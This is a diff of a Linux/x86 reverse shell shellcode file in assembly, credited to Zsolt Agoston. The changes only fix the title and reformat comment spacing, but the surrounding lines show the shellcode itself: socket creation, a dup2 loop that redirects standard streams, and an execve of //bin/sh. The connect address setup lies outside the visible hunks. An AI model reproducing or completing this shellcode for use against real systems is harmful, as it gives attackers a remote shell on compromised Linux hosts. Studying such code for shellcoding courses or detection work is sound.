@@ -1,4 +1,4 @@
-; Title: Linux/x86 Reverse Shell code - 73bit
+; Title: Linux/x86 Reverse Shell code - 73 bytes
 ; Author: Zsolt Agoston (agzsolt)
 
 global _start           
@@ -14,7 +14,7 @@ _start:
 ;SOCK_STREAM = 1 (/usr/include/i386-linux-gnu/bits/socket_type.h)
 ; eax=0x66, ebx=0x01, stack has the socket args: 2,1,0
      
-xor edx, edx	          ; zero out edx
+xor edx, edx	        ; zero out edx
 push 0x66               ; move socket syscall to eax
 pop eax
 push edx                ; protocol=0
@@ -40,7 +40,7 @@ mov ecx, edx            ; loop counter=2, making 3 loops, we use edx which alrea
 stdloop:
         mov al, 0x3f    
         int 0x80
-	      dec ecx
+	dec ecx
         jns stdloop
 
 ;connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
@@ -68,10 +68,10 @@ int 0x80
 ;execve("//bin/sh",["//bin/sh"])
 ; eax=0x0b, ebx=(pointer to the kernel instruction), ecx=0, edx=0
 	
-mov al, 0x0b	          ; execve system call 
-cdq			                ; this trick uses the cdq command, which extends the eax register into edx in case the SF flag is set
+mov al, 0x0b	        ; execve system call 
+cdq			; this trick uses the cdq command, which extends the eax register into edx in case the SF flag is set
                         ; (negative value of eax), which is not the case so it zeros out edx, this way we can save an extra byte
-mov ecx, edx		        ; zero out ecx
+mov ecx, edx		; zero out ecx
 push edx                ; push null
 push 0x68732f6e         ; hs/b
 push 0x69622f2f         ; ib//
